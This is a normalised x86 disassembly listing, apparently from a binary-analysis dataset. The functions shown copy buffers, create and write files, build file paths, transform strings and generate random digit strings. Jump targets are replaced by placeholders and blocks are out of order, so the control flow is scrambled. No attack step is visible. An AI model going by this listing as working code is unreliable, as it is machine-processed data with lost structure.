mov eax [ ebp - 0xc ]
push [ eax + 0x90 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x88 ]
add eax [ ebp - 0x4 ]
push eax
call memcpy
add esp 0xc
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
push 0x400
push 0x0
mov eax [ ebp - 0xc ]
push [ eax + 0x90 ]
call memset
add esp 0xc
jmp r-xdata
jmp r-xdata
push r--data
call printf
pop ecx
mov eax [ ebp - 0xc ]
push [ eax + 0x88 ]
call printf
pop ecx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x80 ]
call sub_4074bf
jmp r-xdata
mov eax [ ebp - 0x4 ]
sub_404d9e
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] 0x1
and [ ebp - 0x4 ] 0x0
push r--data
push 0x0
push 0x0
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x80 ]
call sub_406de6
movzx eax al
test eax eax
je r-xdata
push r--data
call printf
pop ecx
or eax 0xffffffff
jmp r-xdata
and [ ebp - 0xc ] 0x0
jmp r-xdata
leave
retn 0xc
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
cmp ecx [ eax + 0x7c ]
jae r-xdata
push 0x0
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x0
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x80 ]
call sub_404bc3
push eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x80 ]
call sub_407519
movzx eax al
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xb0 ]
mov ecx [ ebp - 0xc ]
push [ eax + ecx * 4 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xac ]
mov ecx [ ebp - 0xc ]
push [ eax + ecx * 4 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x80 ]
call sub_407d6c
jmp r-xdata
push r--data
call printf
pop ecx
or eax 0xffffffff
jmp r-xdata
push 0x2800
push 0x0
mov eax [ ebp - 0x10 ]
push [ eax + 0x8c ]
call memset
add esp 0xc
push 0x2800
mov eax [ ebp - 0x10 ]
push [ eax + 0x8c ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x80 ]
call sub_408dba
push 0x400
push 0x0
mov eax [ ebp - 0x10 ]
push [ eax + 0x90 ]
call memset
add esp 0xc
push 0x200000
push 0x0
mov eax [ ebp - 0x10 ]
push [ eax + 0x88 ]
call memset
add esp 0xc
mov eax [ ebp - 0xc ]
inc eax
mov [ ebp - 0xc ] eax
jmp r-xdata
push 0x400
mov eax [ ebp - 0x10 ]
push [ eax + 0x90 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x80 ]
call sub_408e1b
mov [ ebp - 0x8 ] eax
push [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
push [ eax + 0x90 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x88 ]
add eax [ ebp - 0x4 ]
push eax
call memcpy
add esp 0xc
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x200000
jle r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x80 ]
call sub_4074bf
jmp r-xdata
push 0x400
push 0x0
mov eax [ ebp - 0x10 ]
push [ eax + 0x90 ]
call memset
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x80 ]
call sub_4074bf
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x8 ] 0x0
je r-xdata
sub_404f7a
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0xc ] ecx
mov eax [ ebp - 0xc ]
movzx eax [ eax + 0x8 ]
test eax eax
jne r-xdata
push 0x0
push 0x80
push 0x4
push 0x0
push 0x2
push 0x40000000
push r--data
call [ CreateFileA@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov al 0x1
jmp r-xdata
push 0x0
push 0x80
push 0x2
push 0x0
push 0x2
push 0x40000000
push r--data
call [ CreateFileA@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
leave
retn 0x4
push 0x2
push 0x0
push 0x0
push [ ebp - 0x4 ]
call [ SetFilePointer@IAT ]
and [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x14 ] eax
xor al al
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebp - 0x15 ] al
inc [ ebp - 0x10 ]
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push [ ebp - 0x1c ]
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call [ WriteFile@IAT ]
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
sub_405054
push ebp
mov ebp esp
sub esp 0x2c
mov [ ebp - 0x1c ] ecx
push 0x104
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
push 0x104
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x4 ] eax
push [ ebp - 0x10 ]
push 0x104
call [ GetCurrentDirectoryA@IAT ]
push r--data
push [ ebp + 0x8 ]
call sub_401629
pop ecx
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
push [ ebp - 0x10 ]
push r--data
push [ ebp - 0x4 ]
call sprintf
add esp 0x10
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x28 ] eax
push r--data
push [ ebp - 0x10 ]
push r--data
push [ ebp - 0x4 ]
call sprintf
add esp 0x10
push 0x0
push 0x80
push 0x2
push 0x0
push 0x2
push 0x40000000
push [ ebp - 0x4 ]
call [ CreateFileA@IAT ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax ]
mov [ ebp - 0x29 ] al
mov eax [ ebp - 0x24 ]
mov cl [ ebp - 0x29 ]
mov [ eax ] cl
mov eax [ ebp - 0x20 ]
inc eax
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x24 ]
inc eax
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x29 ] 0x0
jne r-xdata
jmp r-xdata
and [ ebp - 0xc ] 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
call [ WriteFile@IAT ]
push [ ebp - 0x8 ]
call [ CloseHandle@IAT ]
mov al 0x1
xor al al
jmp r-xdata
push 0x0
push 0x80
push 0x2
push 0x0
push 0x2
push 0x40000000
push [ ebp - 0x4 ]
call [ CreateFileA@IAT ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
leave
retn 0xc
sub_405186
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
push [ eax + 0x88 ]
mov ecx [ ebp - 0x4 ]
call sub_4051d0
leave
retn 0xc
sub_4051ab
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
push [ eax + 0x8c ]
mov ecx [ ebp - 0x4 ]
call sub_4051d0
leave
retn 0xc
sub_4051d0
push ebp
mov ebp esp
sub esp 0x2c
mov [ ebp - 0xc ] ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_401629
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x14 ] eax
xor al al
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebp - 0x15 ] al
inc [ ebp - 0x10 ]
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x1c ]
mov [ ebp - 0x4 ] eax
push [ ebp + 0x10 ]
push [ ebp - 0x4 ]
call sub_401629
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
leave
retn 0x10
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x4 ]
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
call memcpy
add esp 0xc
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x14 ]
mov [ ecx + eax ] 0x0
mov al 0x1
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
inc eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x20 ]
mov al [ eax ]
mov [ ebp - 0x25 ] al
inc [ ebp - 0x20 ]
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x24 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x2c ]
mov [ ebp - 0x8 ] eax
sub_405294
push ebp
mov ebp esp
sub esp 0x20
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] 0x1
and [ ebp - 0x4 ] 0x0
push r--data
push 0x0
push 0x0
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x80 ]
call sub_406de6
movzx eax al
test eax eax
je r-xdata
push r--data
call printf
pop ecx
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
inc eax
mov [ ebp - 0x18 ] eax
leave
retn 0x10
mov eax [ ebp - 0x14 ]
mov al [ eax ]
mov [ ebp - 0x19 ] al
inc [ ebp - 0x14 ]
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x18 ]
mov [ ebp - 0x20 ] eax
push [ ebp - 0x20 ]
push [ ebp + 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x80 ]
call sub_40976f
and [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
cmp ecx [ eax + 0x7c ]
jae r-xdata
push 0x0
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x3
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x80 ]
call sub_404bc3
push eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x80 ]
call sub_407519
movzx eax al
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xb0 ]
mov ecx [ ebp - 0xc ]
push [ eax + ecx * 4 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xac ]
mov ecx [ ebp - 0xc ]
push [ eax + ecx * 4 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x80 ]
call sub_407d6c
jmp r-xdata
push r--data
call printf
pop ecx
or eax 0xffffffff
jmp r-xdata
push 0x2800
push 0x0
mov eax [ ebp - 0x10 ]
push [ eax + 0x8c ]
call memset
add esp 0xc
push 0x2800
mov eax [ ebp - 0x10 ]
push [ eax + 0x8c ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x80 ]
call sub_408dba
push 0x400
push 0x0
mov eax [ ebp - 0x10 ]
push [ eax + 0x90 ]
call memset
add esp 0xc
push 0x19000
push 0x0
mov eax [ ebp - 0x10 ]
push [ eax + 0x88 ]
call memset
add esp 0xc
mov eax [ ebp - 0xc ]
inc eax
mov [ ebp - 0xc ] eax
jmp r-xdata
push 0x400
mov eax [ ebp - 0x10 ]
push [ eax + 0x90 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x80 ]
call sub_408e1b
mov [ ebp - 0x8 ] eax
push [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
push [ eax + 0x90 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x88 ]
add eax [ ebp - 0x4 ]
push eax
call memcpy
add esp 0xc
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
push 0x400
push 0x0
mov eax [ ebp - 0x10 ]
push [ eax + 0x90 ]
call memset
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x80 ]
call sub_4074bf
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
sub_4054b8
push ebp
mov ebp esp
sub esp 0x54
push esi
push edi
mov [ ebp - 0x14 ] r--data
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x28 ]
inc eax
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x28 ]
mov al [ eax ]
mov [ ebp - 0x2d ] al
inc [ ebp - 0x28 ]
cmp [ ebp - 0x2d ] 0x0
jne r-xdata
mov eax [ ebp - 0x28 ]
sub eax [ ebp - 0x2c ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x10 ] eax
push 0x2
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov edi [ ebp - 0x4 ]
stosw [ edi ]
and [ ebp - 0x1c ] 0x0
jmp r-xdata
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x10 ]
jae r-xdata
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x48 ]
inc eax
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x4 ]
mov al [ eax ]
mov [ ecx ] al
push [ ebp - 0x4 ]
push [ ebp - 0x14 ]
call sub_401629
pop ecx
pop ecx
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x48 ]
mov al [ eax ]
mov [ ebp - 0x4d ] al
inc [ ebp - 0x48 ]
cmp [ ebp - 0x4d ] 0x0
jne r-xdata
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x4c ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x54 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ ebp - 0x24 ]
call ??3@YAXPAX@Z
pop ecx
pop edi
pop esi
leave
retn
mov eax [ ebp - 0x10 ]
dec eax
sub eax [ ebp - 0x1c ]
mov ecx [ ebp - 0xc ]
add ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x8 ]
mov cl [ ecx ]
mov [ edx + eax ] cl
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x38 ]
inc eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
mov eax [ ebp - 0x38 ]
mov al [ eax ]
mov [ ebp - 0x3d ] al
inc [ ebp - 0x38 ]
cmp [ ebp - 0x3d ] 0x0
jne r-xdata
mov eax [ ebp - 0x38 ]
sub eax [ ebp - 0x3c ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x44 ]
mov ecx [ ebp - 0x14 ]
lea eax [ ecx + eax - 0x1 ]
cmp [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ ebp - 0x1c ]
inc eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x10 ]
dec ecx
sub ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x8 ]
mov esi [ ebp - 0x14 ]
mov al [ esi + eax + 0x1 ]
mov [ edx + ecx ] al
sub_405609
push ebp
mov ebp esp
sub esp 0x30
push esi
push edi
mov [ ebp - 0x14 ] r--data
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
inc eax
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x24 ]
mov al [ eax ]
mov [ ebp - 0x29 ] al
inc [ ebp - 0x24 ]
cmp [ ebp - 0x29 ] 0x0
jne r-xdata
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x28 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
push 0x2
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov edi [ ebp - 0x4 ]
stosw [ edi ]
and [ ebp - 0x1c ] 0x0
jmp r-xdata
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x10 ]
jae r-xdata
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x10 ]
mov [ eax ] 0x0
pop edi
pop esi
leave
retn
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x4 ]
mov al [ eax ]
mov [ ecx ] al
push [ ebp - 0x4 ]
push [ ebp - 0x14 ]
call sub_401629
pop ecx
pop ecx
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
dec eax
sub eax [ ebp - 0x1c ]
mov ecx [ ebp - 0xc ]
add ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x8 ]
mov cl [ ecx ]
mov [ edx + eax ] cl
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x10 ]
dec ecx
sub ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x8 ]
mov esi [ ebp - 0x14 ]
mov al [ esi + eax - 0x1 ]
mov [ edx + ecx ] al
mov eax [ ebp - 0x1c ]
inc eax
mov [ ebp - 0x1c ] eax
sub_4056e9
push ebp
mov ebp esp
sub esp 0x64
mov [ ebp - 0x60 ] ecx
lea eax [ ebp - 0x10 ]
push eax
call sub_401eff
pop ecx
push eax
call srand
pop ecx
push 0x434
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
and [ ebp - 0x64 ] 0x0
mov ecx [ ebp - 0x18 ]
call sub_405948
mov [ ebp - 0x64 ] eax
jmp r-xdata
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x14 ]
cmp ecx [ eax + 0x7c ]
jae r-xdata
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x64 ]
mov [ eax + 0x80 ] ecx
push 0x500000
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x1c ]
mov [ eax + 0xc0 ] ecx
push 0x500000
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x20 ]
mov [ eax + 0xc4 ] ecx
push 0x200000
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x24 ]
mov [ eax + 0x88 ] ecx
push 0x200000
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x28 ]
mov [ eax + 0xb4 ] ecx
push 0x2800
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x8c ] ecx
push 0x400
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x90 ] ecx
push 0x19000
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x34 ]
mov [ eax + 0xa4 ] ecx
push 0x400
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x38 ]
mov [ eax + 0xa8 ] ecx
push 0x400
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x3c ]
mov [ eax + 0x94 ] ecx
push 0x800
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x40 ]
mov [ eax + 0x98 ] ecx
push 0x800
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x44 ]
mov [ eax + 0x9c ] ecx
push 0x64
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x48 ]
mov [ eax + 0xa0 ] ecx
mov eax [ ebp - 0x60 ]
mov [ eax + 0x7c ] 0x10
xor ecx ecx
mov eax [ ebp - 0x60 ]
mov eax [ eax + 0x7c ]
push 0x4
pop edx
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x4c ]
mov [ eax + 0xac ] ecx
xor ecx ecx
mov eax [ ebp - 0x60 ]
mov eax [ eax + 0x7c ]
push 0x4
pop edx
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x50 ] eax
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x50 ]
mov [ eax + 0xb0 ] ecx
push 0x104
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x54 ]
mov [ eax + 0x70 ] ecx
and [ ebp - 0x14 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x60 ]
and [ eax + 0x7c ] 0x0
mov eax [ ebp - 0x60 ]
mov [ eax + 0x8 ] 0x0
leave
retn
push 0x104
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x60 ]
mov eax [ eax + 0xac ]
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x58 ]
mov [ eax + ecx * 4 ] edx
push 0x400
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x60 ]
mov eax [ eax + 0xb0 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x5c ]
mov [ eax + ecx * 4 ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
inc eax
mov [ ebp - 0x14 ] eax
sub_405948
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x14 ]
mov [ eax ] r--data
mov eax [ ebp - 0x14 ]
and [ eax + 0x410 ] 0x0
mov eax [ ebp - 0x14 ]
and [ eax + 0x414 ] 0x0
mov eax [ ebp - 0x14 ]
and [ eax + 0x418 ] 0x0
push 0x400
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x41c ] ecx
push 0x400
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x420 ] ecx
push 0x400
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0xc ]
mov [ eax + 0x424 ] ecx
push 0x400
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x428 ] ecx
mov eax [ ebp - 0x14 ]
leave
retn
sub_4059e5
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_405a0c
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn 0x4
push [ ebp - 0x4 ]
call ??3@YAXPAX@Z
pop ecx
sub_405a2e
push ebp
mov ebp esp
sub esp 0x24
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x42
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x5c ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x18 ]
mov [ eax + 0x60 ] ecx
mov eax [ ebp - 0x4 ]
and [ eax + 0x68 ] 0x0
and [ eax + 0x6c ] 0x0
mov eax [ ebp - 0x4 ]
mov cl [ ebp + 0x10 ]
mov [ eax + 0x57 ] cl
mov eax [ ebp - 0x4 ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x56 ] 0x1
leave
retn 0x14
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x10
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x8 ]
mov al [ eax ]
mov [ ebp - 0x11 ] al
mov eax [ ebp - 0xc ]
mov cl [ ebp - 0x11 ]
mov [ eax ] cl
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
inc eax
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
mov eax [ ebp - 0x18 ]
mov al [ eax ]
mov [ ebp - 0x21 ] al
mov eax [ ebp - 0x1c ]
mov cl [ ebp - 0x21 ]
mov [ eax ] cl
mov eax [ ebp - 0x18 ]
inc eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
inc eax
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x21 ] 0x0
jne r-xdata
sub_405aed
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
mov [ ebp - 0x10 ] ecx
push 0x0
call sub_401eff
pop ecx
mov esi eax
mov edi edx
call [ GetTickCount@IAT ]
xor ecx ecx
add esi eax
adc edi ecx
push esi
call srand
pop ecx
mov eax [ ebp + 0x8 ]
inc eax
push eax
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
and [ ebp - 0x8 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
add eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
pop edi
pop esi
leave
retn 0x4
call rand
cdq
push 0xa
pop ecx
idiv ecx
add edx 0x30
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x8 ]
mov [ eax ] dl
jmp r-xdata
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
sub_405b6a
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] ecx
push 0x0
call sub_401eff
pop ecx
push eax
call srand
pop ecx
mov eax [ ebp + 0x8 ]
inc eax
push eax
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
and [ ebp - 0x8 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
add eax [ ebp + 0x8 ]
mov [ eax ] 0x0
